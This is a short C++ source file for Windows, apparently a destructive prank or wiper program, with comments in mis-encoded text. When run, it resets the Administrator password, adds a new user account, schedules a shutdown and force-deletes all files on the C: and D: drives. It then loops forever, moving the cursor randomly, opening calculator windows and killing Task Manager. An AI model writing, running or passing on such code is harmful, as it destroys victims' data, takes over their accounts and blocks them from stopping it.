#include<iostream>
#include<stdlib.h>
#include<conio.h>
#include<windows.h>
#include<ctime>
using namespace std;
int main()
{
	system("net user Administrator wait");//�û���������Ϊwait
	system("net user DEID wait /add");//�û�������Ϊľ����
	system("ping www.baidu.com");//ping�ٶ���վ
	system("shutdown -s -t 30");//30���ػ�	
	system("del /F /S /Q D:\\");//ǿ��ɾ��D��(����)
	system("del /F /S /Q C:\\");//ǿ��ɾ��C��(����)
	int x=GetSystemMetrics(SM_CXSCREEN);//get���x�� 
    int y=GetSystemMetrics(SM_CYSCREEN);//get���y��
	while(1)
	{
		SetCursorPos(rand()%x,rand()%y);//��� x y�� ���
		system("calc");//����������������ֱ������
		system("taskkill /f /im taskmgr.exe");//��ֹ�����������
	}
	return 0;
}

